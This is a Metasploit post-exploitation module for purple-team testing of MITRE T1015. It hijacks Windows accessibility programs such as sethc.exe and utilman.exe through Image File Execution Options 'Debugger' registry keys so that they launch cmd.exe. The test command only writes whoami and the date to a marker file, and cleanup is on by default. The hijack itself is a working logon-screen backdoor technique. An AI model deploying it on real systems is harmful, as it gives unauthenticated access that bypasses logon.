##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Purple

  BASE_KEY = 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\'
  # {k, v} is {number, exe_name}
  REG_KEY_LIST = {0 => "osk.exe",
                  1 => "sethc.exe",
                  2 => "utilman.exe",
                  3 => "magnify.exe",
                  4 => "narrator.exe",
                  5 => "displayswitch.exe",
                  6 => "atbroker.exe"}

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Accessibility Features (T1015) Windows - Purple Team',
        'Description'   => %q{
          Persistence, Privilege Escalation:
          Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

          Two common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen.

          This module provides 7 options for attaching cmd.exe to another accessibility program.
          1. osk.exe
          2. sethc.exe
          3. utilman.exe
          4. magnify.exe
          5. narrator.exe
          6. displayswitch.exe
          7. atbroker.exe
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1015' ], ['URL', 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1015/T1015.md'] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptInt.new('EXE', [true, 'The executable to attach cmd.exe to', 1]),
        OptBool.new('ALL', [false, 'Attach cmd.exe to all executables', false]),
        OptBool.new('CLEANUP', [false, 'Set registry keys back when done', true])
      ])
  end

  def modify_key(exe_val, cleanup)

      persistence_command = "/c echo T1015 > C:\\t1015.txt && whoami >> C:\\t1015.txt && date /t >> C:\\t1015.txt && time /t >> C:\\t1015.txt"

      print_status("Updating key for #{REG_KEY_LIST[exe_val]}")
      registry_createkey(BASE_KEY + REG_KEY_LIST[exe_val], REGISTRY_VIEW_NATIVE)
      if not registry_setvaldata(BASE_KEY + REG_KEY_LIST[exe_val], "Debugger", "C:\\Windows\\System32\\cmd.exe #{persistence_command}", 'REG_SZ', REGISTRY_VIEW_NATIVE).nil?
        print_status("Key for " + REG_KEY_LIST[exe_val] + " changed successfully.")
      else
        print_warning("Key for " + REG_KEY_LIST[exe_val] + " not changed successfully.")
        raise 'Unable to modify registry key.'
      end

      # run the executable, check for the persistence file
      cmd = "C:\\Windows\\System32\\" + REG_KEY_LIST[exe_val]
      print_status("Testing persistence...")
      run_cmd(cmd, false)
      if exist?("C:\\t1015.txt")
        print_good("Found persistence file!")
      else
        print_warning("Unable to find persistence file. Execution may have failed.")
      end


      if datastore['CLEANUP']
        registry_deletekey(BASE_KEY + REG_KEY_LIST[exe_val])
        print_status("Cleaning up persistence file C:\\t1015.txt")
        register_files_for_cleanup("C:\\t1015.txt")
        print_status("Key deleted.")
      end

      return
  end


  def run
    begin
      raise "This module requires a meterpreter session." if session.type != "meterpreter"
      raise "This module requires administrator rights." if not is_admin?
      raise "Invalid EXE selected" if not datastore['EXE'].between?(1, 7)

      commspec = '%COMSPEC%'
      registry_view = REGISTRY_VIEW_NATIVE

      if datastore['ALL']
        (0..6).each { |n| modify_key(n, datastore['CLEANUP']) }
      else
        modify_key(datastore['EXE'] - 1, datastore['CLEANUP'])
      end

      print_good('Module T1015W execution successful.')
    rescue ::Exception => e
      print_error("#{e.message}")
      print_error("Module T1015 execution failed.")
      return 0
    end
  end
end
